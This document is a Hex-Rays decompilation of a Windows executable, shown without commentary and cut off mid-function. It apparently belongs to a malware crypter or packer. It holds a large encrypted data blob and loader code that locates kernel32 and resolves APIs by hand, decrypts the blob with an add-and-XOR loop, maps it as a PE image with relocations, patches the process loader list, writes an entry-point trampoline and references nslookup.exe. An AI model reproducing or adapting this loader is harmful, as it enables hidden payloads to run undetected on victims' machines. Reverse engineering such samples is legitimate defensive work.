/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401010(int, int, int);
int __cdecl sub_401060(int, int, int);
LPSTR __cdecl sub_4010B0(int, char, int);
unsigned int __cdecl sub_4010F0(int);
int __cdecl sub_401150(int);
// int __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>, int);
int __cdecl sub_401580(int, int);
int __cdecl sub_4015A0(int);
int __stdcall sub_4015D0(int);
int __cdecl sub_401C40(int, int, int);
int __cdecl sub_401CC0(int);
int __cdecl sub_401CF0(int, int);
int __cdecl sub_401E30(int);

//-------------------------------------------------------------------------
// Data declarations

// extern LPSTR (__stdcall *GetCommandLineA)();
// extern HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName);
_UNKNOWN loc_40152E; // weak
_DWORD dword_402005[1109] =
{
  32882004,
  3,
  23455517,
  65535,
  23455617,
  0,
  23455577,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  128,
  266336279,
  -855002112,
  1298423544,
  1750344141,
  1900385200,
  1919381362,
  1648724408,
  1869508193,
  1678231213,
  1853190688,
  554405433,
  542330692,
  1677822068,
  168627502,
  23455549,
  0,
  23437897,
  459084,
  1305733517,
  0,
  23455513,
  51249376,
  963110434,
  5632,
  23440153,
  512,
  23459369,
  4096,
  23451417,
  4194304,
  23459609,
  512,
  23455517,
  1,
  23455517,
  0,
  23418649,
  1024,
  23426081,
  2,
  21358361,
  4096,
  24504089,
  4096,
  23455513,
  16,
  23455513,
  0,
  23430937,
  736,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23435033,
  11008,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  2030082887,
  116,
  23460793,
  4096,
  23461145,
  1024,
  23455513,
  0,
  23455513,
  1615855712,
  1963231991,
  97,
  23455385,
  12288,
  23456025,
  6656,
  23455513,
  0,
  23455513,
  -1068498880,
  1610717447,
  24948,
  23455577,
  16384,
  23456025,
  7168,
  23455513,
  0,
  23455513,
  1080033344,
  1914079543,
  0,
  23455689,
  20480,
  23455513,
  0,
  23455513,
  0,
  23455513,
  -1069547392,
  1610710535,
  24948,
  23456185,
  24576,
  23456537,
  7680,
  23455513,
  0,
  23455513,
  -1070596032,
  1828755767,
  25455,
  23445529,
  28672,
  23446297,
  8704,
  23455513,
  0,
  23455513,
  1113587776,
  1611765831,
  98,
  23456025,
  40960,
  23455513,
  19968,
  23455513,
  0,
  23455513,
  -1070593856,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  23455513,
  0,
  23455513,
  0,
  23455513,
  0,
  -2105516468,
  77662444,
  -932862152,
  -1872305921,
  -2105516436,
  -123664148,
  -932862151,
  -1872305921,
  1384144460,
  -952832893,
  271960861,
  -236453824,
  -2107250899,
  -1779956500,
  -379197657,
  4768,
  -963269996,
  61509,
  1173153561,
  1889603620,
  -966416631,
  67380292,
  -966416695,
  1342186500,
  1173153497,
  1166871588,
  622943757,
  341501960,
  1975838489,
  -2063581104,
  -382756391,
  5204,
  823261586,
  277413952,
  24503233,
  -253459712,
  24624049,
  339929088,
  32433945,
  136594569,
  1094052472,
  608471296,
  1365591581,
  76087360,
  60227389,
  -1014431744,
  24233857,
  605849856,
  24217457,
  -199390464,
  -1570396487,
  4206708,
  88189584,
  -1995422837,
  210619165,
  -1593835500,
  19248813,
  69485705,
  -2007651678,
  -102226940,
  -1603934422,
  4214900,
  88187808,
  -1991228533,
  -460471523,
  -385875949,
  -23458234,
  2520205,
  -2105515924,
  80156908,
  23455997,
  -401211648,
  -379214023,
  -264,
  668032169,
  0,
  -2105516052,
  80156908,
  23455805,
  -401211648,
  -379214087,
  -296,
  668032169,
  0,
  1384144876,
  -1961563005,
  32431836,
  -1858273141,
  1990584089,
  9256251,
  1243031321,
  443,
  622929433,
  4,
  627123737,
  8,
  24542705,
  33063680,
  26895142,
  -1065025536,
  30368790,
  -1070530560,
  1517363866,
  311901,
  23425764,
  1029272768,
  -1050286417,
  -1824711820,
  1957029657,
  1035332577,
  -1050286308,
  2520205,
  475571181,
  1975517184,
  622929252,
  4,
  627123737,
  4,
  24573249,
  33063680,
  -1042245203,
  80195700,
  23454525,
  7769344,
  -19056634,
  -335544321,
  668031638,
  0,
  1804349480,
  -939524097,
  23184221,
  -956301312,
  24036125,
  -639107072,
  -2107250933,
  1366557176,
  -2056640612,
  -146,
  172090206,
  -1879048192,
  -19056762,
  -369098753,
  -23458859,
  2520205,
  155312990,
  -16777216,
  -23441559,
  -1872297985,
  -23418832,
  608487423,
  23455261,
  604292864,
  23455517,
  1215464,
  -22190055,
  -55319,
  622928902,
  260,
  627123225,
  11,
  24607729,
  -3636480,
  -23404608,
  608487423,
  23455261,
  604292864,
  23455521,
  1201128,
  1958634009,
  -18422,
  -393475178,
  -1862270978,
  24493937,
  -1863390464,
  -1846184311,
  -1869574000,
  -2105516596,
  -840427284,
  -1973033175,
  1076919309,
  1974231577,
  604292913,
  19244825,
  1201128,
  -1042237159,
  1153901172,
  1097392957,
  76087360,
  321060669,
  -326959104,
  1973773345,
  604292873,
  19257189,
  -1010183937,
  23455633,
  -1863652608,
  -931110804,
  -1869573949,
  1451253836,
  -326937770,
  154164765,
  -1962117749,
  879124023,
  -385670673,
  -1972007790,
  1926314255,
  682516502,
  -740718381,
  23349617,
  -779616256,
  539689322,
  276663280,
  1514138256,
  -1010213026,
  23455862,
  1340592896,
  -884203016,
  -405548664,
  -1936356448,
  109642819,
  -2141088366,
  52555766,
  21318144,
  -685178880,
  -273281136,
  440,
  -759931111,
  -12546592,
  1148065528,
  274041840,
  1514130592,
  -1010213026,
  -931110836,
  7769539,
  88185508,
  -990077,
  -2010117368,
  1398167525,
  -376870968,
  -402653176,
  23451749,
  -1840920730,
  94562073,
  36,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  196280089,
  -2054619136,
  -23457307,
  203703495,
  23455513,
  136594631,
  23455513,
  -1840922865,
  -165064046,
  -1047986177,
  1978401226,
  80151588,
  337016893,
  129689651,
  231139097,
  -956284848,
  23708509,
  -956301312,
  23970653,
  -1962934272,
  -23946340,
  608471551,
  627122205,
  897197429,
  23222385,
  1346413312,
  1168303833,
  3108,
  1168303897,
  2084,
  -1796282599,
  -2228,
  88191888,
  1847854279,
  -384895778,
  1892,
  1094053754,
  608487168,
  23455525,
  608487168,
  23455505,
  1284344576,
  -2003171346,
  -956029876,
  957399837,
  971518579,
  -1570380002,
  4214852,
  222405342,
  0,
  155296478,
  0,
  -165064302,
  1955201023,
  94561085,
  1903583780,
  107675450,
  1419968512,
  -966416695,
  271428,
  -966400263,
  4203524,
  -778377447,
  -2054598319,
  -23457839,
  14697927,
  241559321,
  -1986902593,
  -23940452,
  1103202815,
  -1846663352,
  4222976,
  -2135665130,
  52555762,
  70349056,
  79725456,
  1951989658,
  1350944741,
  1033504462,
  -1962917776,
  1091945220,
  -268992256,
  -1148392968,
  29,
  -164533102,
  -779485185,
  -258860728,
  -1927526259,
  -23945268,
  -1948569089,
  -23946340,
  130057215,
  -165581680,
  636223487,
  23457425,
  -137219840,
  -23946356,
  -2082829825,
  -1017319877,
  -406770828,
  -941184483,
  150700294,
  1969612568,
  512321085,
  -373948784,
  -1962654072,
  -23946612,
  1976731135,
  1172337118,
  -335544329,
  1373661669,
  83886071,
  -164275310,
  982253567,
  545914264,
  -2092701437,
  -85660449,
  264,
  -1930548724,
  -2224,
  813806480,
  88393408,
  -2111445403,
  -176877320,
  -51809388,
  -2054291457,
  -23462411,
  -145449589,
  -1862073018,
  957398543,
  -10386349,
  -2083777212,
  -916657063,
  -2056655243,
  -23462803,
  265,
  -164271394,
  17367039,
  -2075334887,
  -2224,
  23455399,
  1809527040,
  -23947364,
  -1131608321,
  -23944420,
  894208767,
  1440772322,
  -2046820361,
  -1184203815,
  1,
  -1265493688,
  -2220,
  14543474,
  251658240,
  -899404105,
  -472661624,
  -164281702,
  2113994751,
  1574990337,
  838860791,
  -1855123376,
  956743811,
  242449201,
  -231141186,
  367524012,
  1351181849,
  -1041848809,
  1979201798,
  -1659661,
  -1952549616,
  -23946596,
  550011903,
  -1970951792,
  -571211,
  1372614102,
  -1946157065,
  -23946596,
  -1312323073,
  1317148598,
  -617517703,
  -1862064408,
  -1929366387,
  1173096156,
  1435306020,
  623996285,
  604292868,
  23455512,
  -239640,
  1117121894,
  -145058419,
  -934018218,
  -1872359701,
  128411608,
  17365377,
  705816345,
  959627023,
  243824991,
  956461758,
  -1937736457,
  -1089517292,
  -163734331,
  -1089470465,
  -118729396,
  251775363,
  -699656010,
  -2046836977,
  -2130935850,
  65535,
  -2005237223,
  -1949239304,
  -23947356,
  1090619647,
  -164268912,
  -1956184065,
  -1100327708,
  -10229311,
  -18611578,
  256,
  8284966,
  -2071134208,
  -23526426,
  1163169279,
  1960506025,
  267530642,
  -1979458170,
  -1956249022,
  -622794061,
  13796367,
  1961420569,
  611617248,
  -450857951,
  69485705,
  4319966,
  -402653184,
  -23462507,
  -2079342459,
  23455364,
  -1840398577,
  23457431,
  -1913728256,
  1441531756,
  1301088292,
  623472573,
  604292868,
  23455512,
  -299032,
  827421590,
  -1921645427,
  -1930056691,
  1149886533,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  1424551741,
  609520100,
  1205531165,
  604276994,
  -23155391,
  1988847359,
  1290701085,
  -776007790,
  -622847584,
  -1089522050,
  827421487,
  -1920215551,
  -23463831,
  -829820631,
  -1125243064,
  -2224,
  -1100289022,
  -1106275755,
  -799741675,
  1074203784,
  -284156144,
  -1837252849,
  -1826067393,
  -1660814583,
  -23463863,
  -62999,
  1155199142,
  130050962,
  23455959,
  -372889344,
  -23461887,
  -1981786739,
  -1938961715,
  1284105293,
  -1996625091,
  -840424444,
  -1936064429,
  -1089521892,
  427389538,
  -62999,
  -1982827978,
  -1979711491,
  -23938196,
  611617279,
  627124253,
  260,
  1367202310,
  1381105728,
  222407390,
  0,
  155298526,
  0,
  -165062238,
  1418330111,
  94563069,
  2050098980,
  37949162,
  346226688,
  -1939495095,
  -95091,
  623472022,
  608487180,
  23455505,
  608487168,
  23455517,
  607422720,
  -303688090,
  1216711440,
  983170894,
  -569211,
  -1243156666,
  251658240,
  -1997039242,
  -572267,
  -2101973722,
  -2079387453,
  23455652,
  -4321142,
  -1956255975,
  -572275,
  -2004673802,
  -568139,
  -204214554,
  -145443533,
  -1217790250,
  1076891709,
  950843417,
  -350587650,
  18050107,
  137672207,
  -164547606,
  -1240465409,
  1096144848,
  1979595008,
  -899897316,
  -108796297,
  807761190,
  -1979454501,
  -745349363,
  1125651592,
  -233819632,
  -1956194303,
  -749446956,
  -1872361749,
  -1826065985,
  547012111,
  241542889,
  -651048513,
  1131801249,
  1967454851,
  1168468478,
  -44311,
  846557430,
  -572267,
  -1984498202,
  1089028112,
  -962986538,
  795716,
  -966400231,
  533572,
  -1973033191,
  -570235,
  622948262,
  604292868,
  662286351,
  136168,
  1366116889,
  1153892416,
  23453501,
  1153892352,
  23450429,
  1153892352,
  23582461,
  1153892352,
  23456509,
  1153892352,
  23391997,
  1153892352,
  23454461,
  -1785872384,
  -23462491,
  -14412663,
  495544553,
  -125582455,
  -1243484938,
  -956301311,
  23708509,
  -956301312,
  23970653,
  -1962934272,
  -23942252,
  608995839,
  627123229,
  914231162,
  23354545,
  -1547597568,
  19240745,
  -1839874289,
  -164797806,
  -762970113,
  -672340755,
  -151530959,
  289514334,
  0,
  -2001104220,
  -1962138540,
  -23947348,
  1217735679,
  -2003174354,
  -1995955116,
  -2006859043,
  -771808228,
  -2005857638,
  369042460,
  19240725,
  608487248,
  23455525,
  608487168,
  23455505,
  1170149120,
  1306572715,
  -1979711497,
  -966671523,
  1330390020,
  613252637,
  -1560281087,
  19240697,
  203703495,
  23455513,
  136594631,
  23455513,
  -145980021,
  1173093238,
  80151588,
  1981187901,
  16443406,
  499574553,
  -1929363376,
  -23369044,
  605325823,
  1363530038,
  -1990787008,
  622928730,
  66568,
  1155197465,
  -1357954926,
  -23940196,
  608471551,
  627122717,
  0,
  1366938854,
  -326959040,
  622928421,
  12,
  622928409,
  8,
  624521241,
  604292868,
  1131394784,
  39912,
  1359300121,
  -1920139200,
  -23462767,
  -14414711,
  1168281929,
  3108,
  1168303897,
  2084,
  -1100290279,
  -1786015163,
  -23465515,
  -1996371325,
  -155731889,
  1283785718,
  -2003174866,
  -956029884,
  1394852637,
  1374173440,
  -1570380007,
  4214820,
  -29238624,
  1153913808,
  23456573,
  1153892352,
  23457533,
  -2054488064,
  -23465387,
  69485705,
  1547821790,
  -398914750,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  23455481,
  1078995107,
  627122713,
  0,
  808720006,
  -261780032,
  1580965328,
  -60715575,
  -1846192550
}; // weak
char aUnmapviewoffil[16] = "UnmapViewOfFile"; // weak
char aGetprocaddress[15] = "GetProcAddress"; // weak
char aSystem32Nslook[23] = "\\system32\\nslookup.exe"; // weak
int dword_4079C0 = 0; // weak
int dword_4079C4 = 0; // weak
int dword_4079C8 = 0; // weak
int dword_4079CC = 0; // weak
int dword_4079D0 = 0; // weak
int dword_4079D4 = 0; // weak
int dword_4079D8 = 0; // weak
int dword_4079DC = 0; // weak
int dword_4079E0 = 0; // weak
int dword_4079E4 = 0; // weak
int dword_4079E8 = 0; // weak
int (__stdcall *dword_407A00)(_DWORD); // weak
int (__stdcall *dword_407A04)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407A08)(_DWORD); // weak
int (__stdcall *dword_407A0C)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407A10)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407A14)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407A18)(_DWORD); // weak
int (__stdcall *dword_407A1C)(_DWORD); // weak
int (__stdcall *dword_407A20)(_DWORD, _DWORD); // weak
int (__stdcall *dword_407A24)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_407A28)(_DWORD, _DWORD); // weak
int (__stdcall *dword_407A2C)(_DWORD); // weak
int (__stdcall *dword_407A30)(_DWORD, _DWORD); // weak
int (__stdcall *dword_407A34)(_DWORD, _DWORD); // weak
int (__stdcall *dword_407A38)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__cdecl *dword_407A3C)(_DWORD); // weak


//----- (00401010) --------------------------------------------------------
int __cdecl sub_401010(int a1, int a2, int a3)
{
  for ( dword_4079C8 = 0; dword_4079C8 < a3; ++dword_4079C8 )
  {
    if ( *(unsigned __int8 *)(dword_4079C8 + a1) != *(unsigned __int8 *)(dword_4079C8 + a2) )
      return 1;
  }
  return 0;
}
// 4079C8: using guessed type int dword_4079C8;

//----- (00401060) --------------------------------------------------------
int __cdecl sub_401060(int a1, int a2, int a3)
{
  int result; // eax

  for ( dword_4079C8 = 0; dword_4079C8 < a3; ++dword_4079C8 )
  {
    GetCommandLineA();
    *(_BYTE *)(dword_4079C8 + a1) = *(_BYTE *)(dword_4079C8 + a2);
    result = dword_4079C8 + 1;
  }
  return result;
}
// 4079C8: using guessed type int dword_4079C8;

//----- (004010B0) --------------------------------------------------------
LPSTR __cdecl sub_4010B0(int a1, char a2, int a3)
{
  LPSTR result; // eax

  result = GetCommandLineA();
  for ( dword_4079C8 = 0; dword_4079C8 < a3; ++dword_4079C8 )
  {
    *(_BYTE *)(dword_4079C8 + a1) = a2;
    result = (LPSTR)(dword_4079C8 + 1);
  }
  return result;
}
// 4079C8: using guessed type int dword_4079C8;

//----- (004010F0) --------------------------------------------------------
unsigned int __cdecl sub_4010F0(int a1)
{
  unsigned int i; // [esp+10h] [ebp+8h]

  for ( i = a1 & 0xFFFFF000; *(_WORD *)i != 23117 || *(_DWORD *)(*(_DWORD *)(i + 60) + i) != 17744; i -= 4096 )
    ;
  return i;
}

//----- (00401150) --------------------------------------------------------
int __cdecl sub_401150(int a1)
{
  int v2; // [esp+Ch] [ebp-18h]
  _DWORD *v3; // [esp+14h] [ebp-10h]
  unsigned int i; // [esp+18h] [ebp-Ch]
  _DWORD *v5; // [esp+1Ch] [ebp-8h]
  int v6; // [esp+20h] [ebp-4h]

  v5 = (_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 120));
  v2 = a1 + v5[9];
  v3 = (_DWORD *)(a1 + v5[8]);
  v6 = a1 + v5[7];
  for ( i = 0; i < v5[6]; ++i )
  {
    if ( !sub_401010(a1 + *v3, (int)aGetprocaddress, 14) )
      return a1 + *(_DWORD *)(v6 + 4 * *(unsigned __int16 *)(v2 + 2 * i));
    ++v3;
  }
  return 0;
}

//----- (00401210) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4)
{
  int v5; // [esp+34h] [ebp-164h]
  unsigned int v6; // [esp+40h] [ebp-158h]
  int v7; // [esp+48h] [ebp-150h]
  unsigned int v8; // [esp+4Ch] [ebp-14Ch]
  unsigned int v9; // [esp+54h] [ebp-144h]
  char v10[304]; // [esp+58h] [ebp-140h] BYREF
  _DWORD *v11; // [esp+188h] [ebp-10h]
  int v12; // [esp+18Ch] [ebp-Ch]
  int v13; // [esp+190h] [ebp-8h]
  unsigned int i; // [esp+194h] [ebp-4h]
  int savedregs; // [esp+198h] [ebp+0h] BYREF

  dword_4079E4 = sub_4010F0((int)GetCommandLineA);
  if ( (unsigned __int8)GetCommandLineA != 161 && (unsigned __int8)GetCommandLineA != 235 )
    dword_4079E4 = 1113671;
  dword_407A28 = (int (__stdcall *)(_DWORD, _DWORD))sub_401150(dword_4079E4);
  for ( i = 0; i < 0xF; ++i )
    *(&dword_407A00 + i) = (int (__stdcall *)(_DWORD))sub_401580(dword_4079E4, (int)&aUnmapviewoffil[21 * i]);
  dword_4079D0 = a4;
  dword_4079E0 = (_WORD)a4 == 0;
  if ( !a4 )
    dword_4079E0 = 0;
  if ( dword_4079E0 )
    v12 = dword_4079D0;
  dword_407A30(v10, 230);
  dword_407A34(v10, aSystem32Nslook);
  v13 = dword_407A38(v10, 128, 3, 0, 3, 128, 0);
  if ( v13 == -1 )
    return 0;
  v9 = 0;
  v7 = 0;
  v11 = dword_402005;
  v8 = dword_402005[-1];
  dword_4079DC = sub_401CC0(v8);
  sub_4010B0(dword_4079DC, 0, v8);
  v6 = v8;
  while ( v9 < v8 )
  {
    if ( v6 <= 0x3E8 )
      v5 = v6;
    else
      v5 = 1000;
    sub_401060(v9 + dword_4079DC, (int)&v11[v7], v5);
    v7 += 275;
    LoadIconA(0, (LPCSTR)0x7F00);
    v9 += 1000;
    v6 -= v5;
  }
  for ( i = 0; i < v8; i += 8 )
  {
    *(_DWORD *)(i + dword_4079DC) += i;
    *(_DWORD *)(i + dword_4079DC) ^= i + 23455513;
  }
  dword_4079CC = a2;
  dword_4079C4 = a3;
  dword_4079D8 = a1;
  dword_4079E8 = (int)NtCurrentTeb();
  dword_4079D4 = (int)&savedregs;
  i = (unsigned int)&loc_40152E;
  if ( !dword_4079E0 )
    v12 = dword_407A2C(0);
  sub_401CF0(i - v12, v12);
  sub_4015D0(dword_4079DC);
  if ( dword_4079E0 )
    a4 = dword_4079DC;
  return dword_407A3C(a4);
}
// 402005: using guessed type _DWORD dword_402005[1109];
// 4079C4: using guessed type int dword_4079C4;
// 4079CC: using guessed type int dword_4079CC;
// 4079D0: using guessed type int dword_4079D0;
// 4079D4: using guessed type int dword_4079D4;
// 4079D8: using guessed type int dword_4079D8;
// 4079DC: using guessed type int dword_4079DC;
// 4079E0: using guessed type int dword_4079E0;
// 4079E4: using guessed type int dword_4079E4;
// 4079E8: using guessed type int dword_4079E8;
// 407A00: using guessed type int (__stdcall *dword_407A00)(_DWORD);
// 407A28: using guessed type int (__stdcall *dword_407A28)(_DWORD, _DWORD);
// 407A2C: using guessed type int (__stdcall *dword_407A2C)(_DWORD);
// 407A30: using guessed type int (__stdcall *dword_407A30)(_DWORD, _DWORD);
// 407A34: using guessed type int (__stdcall *dword_407A34)(_DWORD, _DWORD);
// 407A38: using guessed type int (__stdcall *dword_407A38)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407A3C: using guessed type int (__cdecl *dword_407A3C)(_DWORD);

//----- (00401580) --------------------------------------------------------
int __cdecl sub_401580(int a1, int a2)
{
  return dword_407A28(a1, a2);
}
// 407A28: using guessed type int (__stdcall *dword_407A28)(_DWORD, _DWORD);

//----- (004015A0) --------------------------------------------------------
int __cdecl sub_4015A0(int a1)
{
  dword_4079C8 = 1;
  return *(_DWORD *)(a1 + 128);
}
// 4079C8: using guessed type int dword_4079C8;

//----- (004015D0) --------------------------------------------------------
int __stdcall sub_4015D0(int a1)
{
  int v2; // [esp+4h] [ebp-C8h]
  char v3[12]; // [esp+8h] [ebp-C4h] BYREF
  int v4; // [esp+14h] [ebp-B8h]
  _DWORD *v5; // [esp+18h] [ebp-B4h]
  int v6; // [esp+1Ch] [ebp-B0h]
  _DWORD *v7; // [esp+20h] [ebp-ACh]
  int v8; // [esp+94h] [ebp-38h]
  int v9; // [esp+98h] [ebp-34h]
  int *v10; // [esp+9Ch] [ebp-30h]
  int v11; // [esp+A0h] [ebp-2Ch]
  unsigned int v12; // [esp+A4h] [ebp-28h]
  _DWORD *v13; // [esp+A8h] [ebp-24h]
  int *v14; // [esp+ACh] [ebp-20h]
  _DWORD *j; // [esp+B0h] [ebp-1Ch]
  int v16; // [esp+B4h] [ebp-18h]
  int v17; // [esp+B8h] [ebp-14h]
  unsigned int i; // [esp+BCh] [ebp-10h]
  int v19; // [esp+C0h] [ebp-Ch]
  int v20; // [esp+C4h] [ebp-8h]
  int v21; // [esp+C8h] [ebp-4h]

  if ( dword_4079E0 )
  {
    v6 = dword_4079D0;
    v21 = *(_DWORD *)(dword_4079D0 + *(_DWORD *)(dword_4079D0 + 60) + 80);
  }
  v6 = a1;
  v9 = *(_DWORD *)(a1 + 60) + a1;
  v13 = (_DWORD *)(v9 + *(unsigned __int16 *)(v9 + 20) + 24);
  v11 = dword_407A0C(0, *(_DWORD *)(v9 + 80), 12288, 64);
  sub_401060(v11, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v9 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v9 + 6); ++i )
  {
    if ( v13[5] )
    {
      if ( v13[4] )
        sub_401060(
          v13[3] + v11,
          v13[5] + a1,
          *(_DWORD *)(v9 + 60) * ((unsigned int)(v13[4] + *(_DWORD *)(v9 + 60) - 1) / *(_DWORD *)(v9 + 60)));
    }
    v13 += 10;
  }
  v6 = v11;
  v9 = *(_DWORD *)(v11 + 60) + v11;
  v5 = (_DWORD *)(v11 + sub_4015A0(v9));
  if ( dword_4079E0 )
    v19 = 0;
  else
    v19 = dword_407A04(-1, 0, 4, 0, *(_DWORD *)(v9 + 80), 0);
  while ( v5[4] )
  {
    v16 = dword_407A18(v5[3] + v11);
    if ( *v5 )
    {
      v14 = (int *)(*v5 + v11);
      v10 = (int *)(v5[4] + v11);
    }
    else
    {
      v14 = (int *)(v5[4] + v11);
      v10 = (int *)(*v5 + v11);
    }
    v17 = 0;
    if ( v5[4] && *v5 )
      v17 = 1;
    while ( *v14 )
    {
      if ( *v14 >= 0 )
        *v14 = sub_401580(v16, *v14 + v11 + 2);
      else
        *v14 = sub_401580(v16, *v14 & 0x7FFFFFFF);
      if ( v17 )
        *v10 = *v14;
      ++v14;
      ++v10;
    }
    v5 += 5;
  }
  if ( dword_4079E0 )
    dword_4079C0 = 0;
  else
    dword_4079C0 = dword_407A14(v19, 34, 0, 0, 0, *(_DWORD *)(v9 + 52));
  if ( !dword_4079C0 )
  {
    v4 = 1;
    if ( dword_4079E0 )
      v20 = dword_4079D0;
    else
      v20 = dword_407A2C(0);
    if ( !dword_407A00(v20) && !dword_407A10(v20, 0, 0x8000) )
      return 0;
    if ( dword_4079E0 )
    {
      dword_407A0C(v20, v21, 12288, 64);
    }
    else
    {
      dword_4079C0 = dword_407A14(v19, 34, 0, 0, 0, v20);
      if ( !dword_4079C0 )
        dword_4079C0 = dword_407A0C(v20, *(_DWORD *)(v9 + 80), 12288, 64);
    }
  }
  if ( dword_4079E0 )
  {
    dword_4079C0 = v11;
    v8 = v11 - *(_DWORD *)(v9 + 52);
    if ( *(_DWORD *)(v9 + 164) )
    {
      for ( j = (_DWORD *)(*(_DWORD *)(v9 + 160) + v6); j[1]; j = (_DWORD *)((char *)j + j[1]) )
      {
        v12 = (unsigned int)(j[1] - 8) >> 1;
        v7 = j + 2;
        for ( i = 0; i < v12; ++i )
        {
          if ( (int)*((unsigned __int16 *)v7 + i) >> 12 == 3 )
            *(_DWORD *)(*j + v11 + (*((_WORD *)v7 + i) & 0xFFF)) += v8;
        }
      }
    }
    dword_407A3C = (int (__cdecl *)(_DWORD))(*(_DWORD *)(v9 + 40) + dword_4079C0);
    v2 = *(_DWORD *)(v9 + 40) + v20;
    v6 = dword_4079D0;
    *(_WORD *)(v9 + 22) |= 0x2000u;
    dword_407A24(v2, 6, 64, v3);
    *(_BYTE *)v2 = 104;
    *(_DWORD *)(v2 + 1) = dword_407A3C;
    *(_BYTE *)(v2 + 5) = -61;
    dword_4079DC = dword_4079C0;
    sub_401C40(dword_4079D0, *(_DWORD *)(v9 + 40) + dword_4079C0, dword_4079C0);
  }
  else
  {
    v8 = dword_4079C0 - *(_DWORD *)(v9 + 52);
    if ( *(_DWORD *)(v9 + 164) && v8 )
    {
      for ( j = (_DWORD *)(*(_DWORD *)(v9 + 160) + v6); j[1]; j = (_DWORD *)((char *)j + j[1]) )
      {
        v12 = (unsigned int)(j[1] - 8) >> 1;
        v7 = j + 2;
        for ( i = 0; i < v12; ++i )
        {
          if ( (int)*((unsigned __int16 *)v7 + i) >> 12 == 3 )
            *(_DWORD *)(*j + v11 + (*((_WORD *)v7 + i) & 0xFFF)) += v8;
        }
      }
    }
    sub_401060(dword_4079C0, v11, *(_DWORD *)(v9 + 80));
    dword_407A08(v19);
    sub_401E30(dword_4079C0);
    sub_401C40(v20, *(_DWORD *)(v9 + 40) + dword_4079C0, dword_4079C0);
    dword_407A3C = (int (__cdecl *)(_DWORD))(*(_DWORD *)(v9 + 40) + dword_4079C0);
    *(_DWORD *)(v9 + 40) = dword_407A3C;
  }
  return 1;
}
// 4079C0: using guessed type int dword_4079C0;
// 4079D0: using guessed type int dword_4079D0;
// 4079DC: using guessed type int dword_4079DC;
// 4079E0: using guessed type int dword_4079E0;
// 407A00: using guessed type int (__stdcall *dword_407A00)(_DWORD);
// 407A04: using guessed type int (__stdcall *dword_407A04)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407A08: using guessed type int (__stdcall *dword_407A08)(_DWORD);
// 407A0C: using guessed type int (__stdcall *dword_407A0C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 407A10: using guessed type int (__stdcall *dword_407A10)(_DWORD, _DWORD, _DWORD);
// 407A14: using guessed type int (__stdcall *dword_407A14)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407A18: using guessed type int (__stdcall *dword_407A18)(_DWORD);
// 407A24: using guessed type int (__stdcall *dword_407A24)(_DWORD, _DWORD, _DWORD, _DWORD);
// 407A2C: using guessed type int (__stdcall *dword_407A2C)(_DWORD);
// 407A3C: using guessed type int (__cdecl *dword_407A3C)(_DWORD);
// 4015D0: using guessed type char var_C4[12];

//----- (00401C40) --------------------------------------------------------
int __cdecl sub_401C40(int a1, int a2, int a3)
{
  _DWORD *v4; // [esp+4h] [ebp-8h]

  v4 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_4079E8 + 48) + 12) + 12);
  do
  {
    if ( !v4 )
      return 0;
    if ( v4[6] == a1 )
    {
      v4[7] = a2;
      v4[6] = a3;
      return 1;
    }
